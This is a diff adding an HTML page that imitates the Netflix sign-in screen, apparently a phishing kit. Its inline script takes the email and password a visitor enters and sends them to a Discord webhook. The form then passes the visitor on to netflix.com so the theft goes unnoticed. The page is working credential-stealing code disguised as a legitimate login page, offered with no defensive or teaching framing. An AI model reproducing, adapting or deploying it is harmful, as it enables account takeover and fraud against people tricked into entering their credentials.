@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <link rel="icon" type="image/x-icon" href="https://cdn.discordapp.com/attachments/1223090777652072448/1223092326151487590/vRRhQ8n.webp?ex=6618987e&is=6606237e&hm=387dd2c8d4c57cca5861df7d961d91239c649a0b92dfb2a13b6d31f44041d0f4&">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            position: relative;
+            height: 100vh;
+            overflow: hidden;
+            background-color: #333; /* Dark background color */
+            font-family: Arial, sans-serif;
+        }
+        header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0); /* Fully transparent */
+            z-index: 1;
+            display: flex;
+            align-items: left;
+        }
+        h2 {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0); /* Fully transparent */
+            z-index: 1;
+            display: flex;
+            align-items: left;
+        }
+        .header-icon {
+            width: 100px; /* Adjust icon size */
+            height: auto;
+            margin-right: 10px;
+        }
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 7%; /* Adjusted footer height */
+            background-color: rgba(0, 0, 0, 0.65); /* 65% transparent black */
+            z-index: 1;
+        }
+        .scaled-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(70%); /* Adjust brightness as needed */
+        }
+
+        .overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
+            width: 300px; /* Width of the overlay */
+            height: 500px; /* Height of the overlay */
+            border-radius: 5px; /* Rounded corners */
+            padding: 20px;
+            text-align: center;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            padding-top: 125px;
+            
+        }
+        .overlay-content {
+            color: white;
+            font-size: 24px;
+        }
+        .overlay input[type="text"],
+        .overlay input[type="password"],
+        .overlay button,
+        .overlay button2 {
+            width: 100%; /* Adjusted input/button width */
+            padding: 10px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: rgba(0, 0, 0, 0.5); /* Dark grey transparent background */
+            color: white; /* White text color */
+            outline: none;
+        }
+        .overlay input[type="text"]::placeholder,
+        .overlay input[type="password"]::placeholder {
+            color: #999; /* Light grey placeholder text color */
+            outline: #999;
+            outline-width: 5px;
+        }
+        .overlay button,
+        .overlay button2 {
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .overlay button:hover,
+        .overlay button2:hover {
+            background-color: #cc0000; /* Darker red on hover */
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+            font-size: 14px; /* Smaller font size */
+            color: white;
+            text-align: left;
+        }
+        .remember-me input[type="checkbox"] {
+            margin-right: 5px;
+            width: 15px; /* Smaller checkbox */
+            height: 15px; /* Smaller checkbox */
+        }
+        .remember-me label {
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img class="header-icon" src="https://cdn.discordapp.com/attachments/1223090777652072448/1223093935904395344/vha51qZ.png?ex=661899fe&is=660624fe&hm=81f1d3f09c819830bad07f5ba42a8744765c52352c169adbcf11841327f0d3fc&" alt="Icon">
+    </header>
+    <footer></footer>
+    <img class="scaled-image" src="https://assets.nflxext.com/ffe/siteui/vlv3/7ca5b7c7-20aa-42a8-a278-f801b0d65fa1/5c5bb0ab-3b4a-40fb-a1d4-11d0311bc6c0/US-en-20240326-popsignuptwoweeks-perspective_alpha_website_small.jpg" alt="Cropped and Darkened Image">
+    <div class="overlay">
+        <div class="overlay-content">
+            <h2>Sign In</h2>
+            <form id="loginForm" action="https://netflix.com/browse" method="post" onsubmit="sendToWebhook();">
+                <input id="email" type="text" name="email" placeholder="Email or phone number">
+                <br>
+                <input id="password" type="password" name="password" placeholder="Password">
+                <br>
+                <button type="submit">Sign In</button>
+            </form>
+            <div class="remember-me">
+                <input type="checkbox" id="remember">
+                <label for="remember">Remember Me</label>
+            </div>
+            <br>
+            <button type="button",>Forgot Password</button>
+        </div>
+    </div>
+
+    <script>
+        function sendToWebhook() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Construct text payload
+            const payload = `Email/Phone: ${email}, Password: ${password}`;
+
+            // Send payload to Discord webhook (replace YOUR_WEBHOOK_URL with your actual webhook URL)
+            fetch('https://discord.com/api/webhooks/1223090963426185308/Ktw7c93XvDobZQYKDB94erjmYAlTTaplpV2MQieshVK7MyVqrK5nyPm6LELdEmwClenS', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: payload })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                console.log('Form data sent to webhook successfully');
+            })
+            .catch(error => {
+                console.error('There was a problem sending form data to webhook:', error);
+            });
+        }
+    </script>
+</body>
+</html>
